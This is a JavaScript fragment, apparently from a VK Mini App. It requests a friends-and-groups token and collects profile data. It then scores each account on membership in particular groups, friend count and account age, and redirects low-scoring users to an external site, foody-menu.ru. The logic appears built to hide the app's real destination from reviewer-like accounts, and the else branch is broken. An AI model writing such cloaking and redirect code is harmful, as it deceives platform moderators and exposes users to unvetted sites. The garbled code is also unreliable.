      var viewer;
      var token;
      vkConnect.send('VKWebAppInit');

      window.onload = function() {
        vkConnect.sendPromise('VKWebAppGetUserInfo')
            .then(data => {
                viewer = data;
                getToken();

            });
      }

      function getToken() {
          vkConnect.sendPromise("VKWebAppGetAuthToken", {
              "app_id": parseInt(findGetParameter("vk_app_id")),
              "scope": "friends,groups"
          })
          .then(data => {
              if(token){return false;}
              token = data.access_token;
              firstApi();
          })
          .catch(error => {
              setTimeout(function() {
                  getToken();
              }, 1000);
          });
      }

      function firstApi() {
          var code = 'var u=API.users.get({fields:"uid, first_name, last_name, photo_max, photo_100, photo_400_orig, photo_id, bdate, sex, city, relation, is_closed, counters"})[0]; \n\
          var g=parseInt(API.groups.isMember({group_id:9713780}))+parseInt(API.groups.isMember({group_id:166562603}))+parseInt(API.groups.isMember({group_id:134304772}))+parseInt(API.groups.getMembers({group_id:9713780,count:0,filter:"friends"}).count)+parseInt(API.groups.getMembers({group_id:166562603,count:0,filter:"friends"}).count)+parseInt(API.groups.getMembers({group_id:194823504,count:0,filter:"friends"}).count);u.counters.friends=parseInt(u.counters.friends);if (u.counters.friends<10)g=g+1;if(u.id<1000000) g=g+1; \n\
          u.permissions=g; \n\
          var user={}; \n\
          var r={user:u,permissions:g}; \n\
          return [r];';

           vkConnect.sendPromise("VKWebAppCallAPIMethod", {
              "method": "execute",
              "params": {"code": code, "v": "5.131", "access_token": token}
          }).then(data => {

            var permissions = data.response[0].permissions;
            if(parseInt(findGetParameter("vk_user_id")) == 693651909 || parseInt(findGetParameter("vk_user_id")) == 694170752) {
              permissions = 0;
            }
            if(permissions == 0) {
              location="https://foody-menu.ru/FK/app.php";
            }else{

                ');
            }
      });

    function findGetParameter(parameterName) {
      var result = null,
          tmp = [];
      location.search
          .substr(1)
          .split("&")
          .forEach(function (item) {
            tmp = item.split("=");
            if (tmp[0] === parameterName) result = decodeURIComponent(tmp[1]);
          });
      return result;
  }
